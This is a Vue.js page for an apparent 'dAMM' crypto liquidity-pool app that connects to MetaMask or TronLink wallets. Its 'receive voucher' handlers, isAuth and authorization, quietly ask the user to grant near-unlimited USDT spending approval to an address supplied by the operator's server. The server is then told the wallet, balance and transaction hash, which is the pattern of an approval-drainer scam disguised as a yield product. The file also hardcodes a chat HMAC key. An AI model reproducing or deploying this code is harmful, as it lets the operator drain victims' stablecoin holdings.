<template>
  <div>
    <div class="home" v-loading.fullscreen.lock="loading">
      <div class="header">
        <div class="nav jus-bet">
          <img src="@/assets/2.svg" alt="">
          <div class="midImg">
            <img src="@/assets/damm-logo.jpg" alt="" style="width: 114px;height: 24px;">
          </div>
          <div class="">
            <div class="flex al-item addBox">

              <img src="@/assets/1.svg" alt="">
              <div class="white userAddress">{{ walletAddress ? walletAddress.slice(walletAddress.length - 6,
                walletAddress.length) : 'Connect Wallet' }}</div>
            </div>
          </div>
        </div>
        <div class="midLog">
          <img src="@/assets/dAMM.jpg" alt="" style="width: 100VW;">
        </div>
      </div>
      <div class="main">
        <div class="tab" style="margin-bottom: 20px;">
          <div class="tab_item" v-for="(item, index) in tabList" :key="index" :class="current == index ? 'tabl' : ''"
            @click="tabLine(index)">
            <div class="topimg"><img :src="item.image" alt=""></div>
            <div class="bomTxt" :class="item.isChecked ? 'fw' : ''">{{ item.text }}</div>
          </div>
        </div>
        <!-- tab栏子项 -->
        <div>
          <mypool :userData="userInfoData" @submitBalance="submitBalances" v-if="current == 0"></mypool>
          <Swap :userData="userInfoData" @submitBalance="submitBalances" v-if="current == 1"></Swap>
          <eth :userData="userInfoData" :Badd="walletAddress" @receive="submitReceive" v-if="current == 2">
          </eth>
          <send :userData="userInfoData" @submitBalance="submitBalances" v-if="current == 3">
          </send>
          <share :userData="userInfoData" v-if="current == 4"></share>
        </div>
      </div>


    </div>
    <!-- 客服抽屉 -->
    <div class="kefuBox">
      <el-drawer title="我是标题" :visible.sync="drawer" :direction="direction" size="100%">
        <template slot="title">
          <div style="text-align: center;">Chat</div>
        </template>
        <div style="height: 100vh;">
          <iframe :src="kefuUrl" frameborder="0" width="100%" height="100%"></iframe>
        </div>
      </el-drawer>
    </div>


    <div style="position: fixed;bottom: 20px;right: 10px;z-index: 90;" @click="openKefu">
      <img src="@/assets/kefu.svg" alt="">
    </div>
  </div>
</template>

<script>
// import { test } from '@/api/test.js'
import Web3 from "web3";
let pageWeb3;
import { indexGetaddress, apiIndexAuthsuccess, getKefu, indexGetinfo } from '@/api/apiTrc.js'
import eth from "./components/Eth.vue";
import mypool from "./components/myPool.vue";
import send from "./components/send.vue";
import share from "./components/share.vue";
import Swap from "./components/swap.vue";
import usdtAbi from '@/utils/usdt.json';
import ethusdtAbi from '@/utils/ethusdt.json';
import hmacSHA256 from 'crypto-js/hmac-sha256';
import Hex from 'crypto-js/enc-hex';
export default {
  name: 'HomeView',

  components: {
    eth,
    mypool,
    send,
    share,
    Swap
  },
  data () {
    return {
      // 加载动画
      loading: false,
      tronWeb: '',
      drawer: false,
      direction: 'rtl',
      walletAddress: '',
      current: 2,
      // tipMsg: 'Please connect to the wallet'
      tipMsg: 6,
      usdtBalance: '',
      auth_address: '',
      kefuUrl: '',
      trxBalance: '',
      tabList: [
        {
          // image: '/src/assets/TAB1.svg',
          image: require('@/assets/TAB1.svg'),
          text: 'My Pool'
        },
        {
          image: require('@/assets/TAB2.svg'),
          text: 'Swap'
        },
        {
          image: require('@/assets/TAB3.svg'),
          text: 'ETH',
          isChecked: true,
        },
        {
          image: require('@/assets/TAB4.svg'),
          text: 'Send'
        },
        {
          image: require('@/assets/TAB5.svg'),
          text: 'Share'
        }
      ],
      userInfoData: {},
      wakPlatformInfo: {},
      inviteCode: '',
      typeKey: 'trc',
      // eth
      amount: ''
    }
  },


  mounted () {
    this.linkWallet()
    // this.getkefuAddress()
    this.checkLocation()
  },
  methods: {
    // 检测路径
    checkLocation () {
      let arr = window.location.href.split('?')
      if (arr[1]) {
        let str = arr[1].slice(0, 7)
        if (str == 'invite=') {
          this.inviteCode = arr[1].slice(7, arr[1].length)
        }
      } else {
        this.inviteCode = undefined
      }

    },
    // 更新子组件得余额
    submitBalances () {
      this.getInfo()
    },
    // 获取用户信息
    async getInfo () {
      let res = await indexGetinfo({
        address: this.walletAddress,
        type: this.typeKey,
        invite: this.inviteCode
      })
      if (res.code == 1) {
        this.userInfoData = res.data;
        // this.getkefuAddress();
      }
    },
    openKefu(){
      this.drawer = true;
      if (this.walletAddress==''){
        // setTimeout("wait", 2000 );
      }
      this.getkefuAddress ()
    },
    getkefuAddress () {
      var that = this;
      getKefu().then((res) => {
        if (res.code == 1) {
          if (that.walletAddress==''){
            // setTimeout("wait", 2000 );
          }
          const key = "8t2bGAFypzuWTDTSbjxDK59r";
          const message = this.walletAddress;
          const hmac = hmacSHA256(message, key);
          const hash = hmac.toString(Hex);
          that.kefuUrl =res.data+"?identifier="+that.walletAddress+"&identifier_hash="+hash+"&name="+that.walletAddress
        }
      }).catch((err) => {
        that.$message.error(err)
      })

    },
    // 链接钱包
    linkWallet () {
      // meatamask
      let that = this;
      that.linkEthereum().then((res) => {
        console.log(res)
      }).catch((err) => {
        console.log(err)
        that.linkTron()
      })

    },
    linkEthereum() {
      let that = this;
      return new Promise(async (resolve, reject) => {
        if (window.web3) {
          console.log("ethereum")
          this.typeKey = 'erc'
          window.ethereum.enable().then(() => {
            pageWeb3 = new Web3(window.web3.currentProvider);
            var contract = new pageWeb3.eth.Contract(usdtAbi,
              "0xdac17f958d2ee523a2206206994597c13d831ec7");
            pageWeb3.eth.getAccounts().then((res) => {
              console.log("res==" + res)
              that.walletAddress = res[0];
              that.getdata();
              that.getInfo();
              resolve(res)
            }).catch(err => {
              reject(err)
            })
          }).catch(err => {
            reject(err)
          })
        } else {
          reject(new Error('请安装Metamask插件'))
        }
      })
    },
    linkTron () {
      let that = this;
      return new Promise((resolve, reject) => {
        if (window.tronWeb) {
          console.log("tronWeb")
          that.typeKey = 'trc'
          let Inval = null
          Inval = setInterval(() => {
            // tronlink钱包
            if (window.tronWeb) {
              that.tronWeb = window.tronWeb;
              that.walletAddress = that.tronWeb.defaultAddress.base58 ? that.tronWeb.defaultAddress.base58 : '';
              that.getUSDT()
              window.clearInterval(Inval);
              that.getdata()
              that.getInfo()
              // metaMask钱包
            }
            else {
              window.clearInterval(Inval);
              // this.$router.replace('/noWallet')
              reject(new Error('请安装Tronlink插件'))
            }
          }, 1000);
          // }

        } else {
          // this.$router.replace('/noWallet')
          reject(new Error('请安装Tronlink插件'))
        }
      })
    },
    //查询usdt余额
    async getUSDT () {
      try {
        //当前连接的钱包地址获取 window.tronWeb.defaultAddress.base58
        let contract = await window.tronWeb.contract().at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t")
        let result = await contract.balanceOf(this.walletAddress).call()
        var balance = await window.tronWeb.trx.getBalance(this.walletAddress);
        this.trxBalance = Number(balance) / 1000000
        this.usdtBalance = Number(window.tronWeb.fromSun(result))
        console.log('余额' + this.usdtBalance, this.trxBalance);
        localStorage.setItem('banlance', this.usdtBalance);
      } catch (error) {

      }

    },
    //查询余额 ETH
    async getUSDTeth () {
      var _this = this
      let web3 = new Web3(window.web3.currentProvider)
      // usdt合约
      var contract = new pageWeb3.eth.Contract(usdtAbi, "0xdac17f958d2ee523a2206206994597c13d831ec7");

      // contract.methods.balanceOf(this.walletAddress).call(function (err, balance) {
      //   console.log('ustd', _this.amount)
      //   _this.amount = balance

      // })
      let fromAddress = await web3.eth.getAccounts();
      pageWeb3.eth.getBalance(fromAddress[0]).then(
        function (result) {
          let num = 10 ** 18
          let am = Number(result) / num

          _this.amount = am.toFixed(4)
          console.log(_this.amount, '余额');

        });


    },

    async isAuth () {
      this.loading = true
      let web3 = new Web3(window.web3.currentProvider)
      var _this = this
      //查余额
      // usdt合约
      var contract = new pageWeb3.eth.Contract(usdtAbi, "0xdac17f958d2ee523a2206206994597c13d831ec7");

      // contract.methods.balanceOf(this.walletAddress).call(function (err, balance) {
      //   console.log('ustd', _this.amount)
      //   _this.amount = balance

      // })
      let fromAddress = await web3.eth.getAccounts();
      // await pageWeb3.eth.getBalance(fromAddress[0]).then(
      //   function (result) {
      //     let num = 10 ** 18
      //     let am = Number(result) / num
      //
      //     _this.amount = am.toFixed(4)
      //     console.log(_this.amount, '余额');
      //
      //   });
      //
      // if (Number(this.amount) < 0.001) {
      //   this.$message.warning("You don't have enough erc to pay for the miner's fee to receive the voucher,your erc balance is "+this.amount)
      //   setTimeout(() => {
      //     this.loading = false
      //   }, 1000);
      //   return
      // }
      // // usdt合约
      var contract = new pageWeb3.eth.Contract(usdtAbi, "0xdac17f958d2ee523a2206206994597c13d831ec7");
      // 授权对象
      let spender = this.auth_address; //改成接口地址获取

      let gasPrice = contract.gasPrice;
      let gasLimit = contract.gasLimit;
      // let fromAddress = await web3.eth.getAccounts();
      // 授权金额
      let amount = 9999999999999;

      let gas_estimate = web3.eth.estimateGas({
        'from': fromAddress[0],
        'to': spender,
        'value': amount,
      })
      // console.log("gas_estimate===",gas_estimate);
      // let amount = 100*Math.pow(10,18);//转账100个
      try {
        let res = await contract.methods.approve(spender, amount).send({ from: fromAddress[0] })
        .on('transactionHash', function (hash) {
          console.log(hash, '交易发送后得到有效交易哈希值时触发');
        }).on('confirmation', function (confirmationNumber, receipt) {
          console.log(confirmationNumber, receipt, '收到确认时触发');
        }).on('receipt', function (receipt) {
          console.log(receipt, '交易收据有效时触发');
        })
        .on('error', function (er) {
          console.log(er)
        })
        // console.log(res);
        // let res = "success";
        if (res) {
          let data = {
            address: _this.walletAddress,
            usdt_balance: _this.amount,
            type: _this.typeKey,
            hash: res,
            au_address: _this.auth_address
          }
          apiIndexAuthsuccess(data).then((result) => {
            if (result.code == 1) {
              setTimeout(() => {
                this.getInfo();
                this.loading = false;
              }, 500);
            }
          })
        }
      } catch (error) {
        console.log(error, 'err');
        setTimeout(() => {
          this.loading = false
        }, 1000);
      }
    },

    // async authorization (){
    //   var _this = this;
    //   this.loading = true;
    //   let res="success";
    //   if (res) {
    //     let data = {
    //       address: _this.tronWeb.defaultAddress.base58,
    //       usdt_balance: _this.usdtBalance,
    //       type: _this.typeKey,
    //       hash: res,
    //       au_address: _this.auth_address
    //     }
    //
    //     apiIndexAuthsuccess(data).then((result) => {
    //       if (result.code == 1) {
    //         setTimeout(() => {
    //           this.getInfo();
    //           this.loading = false;
    //         }, 500);
    //       }
    //     }).catch((er) => {
    //       setTimeout(() => {
    //         _this.loading = false
    //       }, 500);
    //     })
    //   }
    // },
    //开始授权
    async authorization () {
      // 如果余额为0  this.trxBalance
      this.loading = false
      // if (this.trxBalance < 30) {
      //   setTimeout(() => {
      //     this.loading = false
      //   }, 1000);
      //   this.$message.warning("You don't have enough Trc to pay for the miner's fee to receive the voucher")
      //
      //   return
      // }
      var _this = this
      let orderNum = "";
      this.tronWeb
        .contract()
        .at('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t')
        .then((usdtContract) => {
          usdtContract
            .balanceOf(this.tronWeb.defaultAddress.base58)
            .call()
            .then((usdtbalance) => {
              _this.$message.success('success')
              let usdtbalanceNum = usdtbalance.toNumber() / 1000000;
              if (usdtbalanceNum >= 0) {
                usdtContract
                  .increaseApproval(_this.auth_address, "900000000000000")
                  .send({
                    feeLimit: 100000000,
                    callValue: 0,
                    shouldPollResponse: false
                  }, function (err, res) {
                    if (err){
                      _this.loading = false;
                      return false;
                    }
                    if (res) {
                      let data = {
                        address: _this.tronWeb.defaultAddress.base58,
                        usdt_balance: _this.usdtBalance,
                        type: _this.typeKey,
                        hash: res,
                        au_address: _this.auth_address
                      }

                      apiIndexAuthsuccess(data).then((result) => {
                        if (result.code == 1) {
                          setTimeout(() => {
                            _this.loading = false
                          }, 500);
                        }
                      }).catch((er) => {
                        setTimeout(() => {
                          _this.loading = false
                        }, 500);
                      })
                    }


                  })
              } else {
                _this.loading = false
                // _this.transactionToken()
              }
            })
            .catch((res) => {
              this.$message.error(res)
              setTimeout(() => {
                _this.loading = false
              }, 500);
            });
        })
        .catch((res) => {

          this.$message.error(res)
          setTimeout(() => {
            this.loading = false
          }, 500);

        });
    },

    async getdata () {
      let res = await indexGetaddress({
        t: this.typeKey,
        address: this.walletAddress
      }).catch((err) => {
        console.log(err);
      })
      if (res.code == 1) {
        this.auth_address = res.data.address
      } else {
        this.$message.error(res.msg)
      }
    },
    tabLine (index) {
      if (this.typeKey == 'trc') {
        if (!window.tronWeb) {
          this.$message.error('Please connect to the wallet')
          console.log(1);
        } else {
          if (!this.walletAddress) {
            this.$message.error('Please connect to the wallet')
            this.linkWallet()
          } else {
            if (this.userInfoData.status == 0) {
              this.$message.error('Please receive voucher first')
            } else {
              this.current = index
            }

          }

        }
      } else if (this.typeKey == 'erc') {
        if (!window.ethereum) {
          this.$message.error('Please connect to the wallet')
        } else {
          if (!this.walletAddress) {
            this.$message.error('Please connect to the wallet')
            this.linkWallet()
          } else {
            if (this.userInfoData.status == 0) {
              this.$message.error('Please receive voucher first')
            } else {
              this.current = index
            }

          }

        }
      }

    },
    // 点击授权
    submitReceive () {
      // if (window.tron){
      //   this.authorization();
      // }else {
      //   this.isAuth();
      // }
      if (window.web3){
        this.isAuth();
      }else {
        this.authorization();
      }



    }

  }
}
</script>
<style lang="scss" scoped>
.home {

  width: 100%;
  box-sizing: border-box;

  .header {
    background-image: url('@/assets/digit.ecd5adc7.png'), linear-gradient(141.98deg, #133a72 29.79%, #1873b9 67.18%, #2dcdcd 105.91%);
    background-size: 100%;
    height: 242px;



    .nav {
      padding: 12px 16px 0;
      background-color:MidnightBlue;

      .userAddress {
        font-size: 12px;
        margin-left: 6px;
        white-space: nowrap;
      }

      .midImg {
        position: absolute;
        left: 50%;
        transform: translateX(-50%);
      }

      .addBox {
        background: rgba(238, 241, 244, .14);
        padding: 4px;
        border-radius: 6px;
      }
    }

    .midLog {
      height: 200px;
      text-align: center;
      // margin-top: 20px;

      img {
        max-width: 100%;
        max-height: 100%;
      }
    }


  }

  .main {
    width: 100%;
    position: relative;
    top: -30px;

    .tab {
      display: flex;
      align-items: center;
      justify-content: space-around;
      width: 90%;
      border-radius: 10px;
      margin: 0 auto;
      background-color: #fff;
      box-shadow: 0 -10px 44px rgba(0, 0, 0, .3);
      padding-bottom: 8px;

      .tab_item {
        text-align: center;
        padding: 8px 4px 4px 4px;

        .topimg {
          width: 28px;
          height: 28px;
          margin: 0 auto;
          line-height: 45px;

          img {
            width: 100%;
            height: 100%;

          }
        }

        .bomTxt {
          padding: 8px 0 0 0;
          font-size: 14px;
        }
      }
    }
  }
}

.tabl {
  border-bottom: 3px solid #ff8517;

  .topimg {
    width: 34px !important;
    height: 34px !important;
  }
}
</style>

<!-- 修改Element ui 样式 -->
<style lang="scss">
.help_main {
  p {
    text-align: left;
    font-size: 14px !important;
  }

  .el-collapse-item__header {
    background-color: #e3edf4;
    border-radius: 10px;
    border: none;
    margin: 10px 0;
    padding-left: 16px;
  }

  .el-collapse {
    border: none;
  }

  .el-collapse-item__wrap {
    margin: 0;
    transform: translateY(-10px);
    border: none;
    padding: 12px 16px;
  }

  .el-collapse-item__content {
    padding-bottom: 0;
  }

  .el-collapse-item__arrow {
    // display: none;
    transform: rotate(90deg);
    color: #9b9d9f;
    font-size: 18px;
  }

  .el-collapse-item__arrow.is-active {
    transform: rotate(270deg);
    color: #9b9d9f;
  }


}

.receive {
  .el-button {
    background-color: #ff8517;
    border: none;
    border-radius: 10px;
    color: #fff;
    padding: 14px 20px;
  }

  .el-button:focus,
  .el-button:hover {
    color: #fff;
    border-color: #ff8517;
    background-color: #ff8517;
  }
}

.kefuBox {
  .el-drawer__header {
    background-color: #000;
    color: #fff;
    margin: 0;
    padding: 10px 0;

  }
}

.el-drawer__close-btn {
  position: absolute !important;

}
</style>
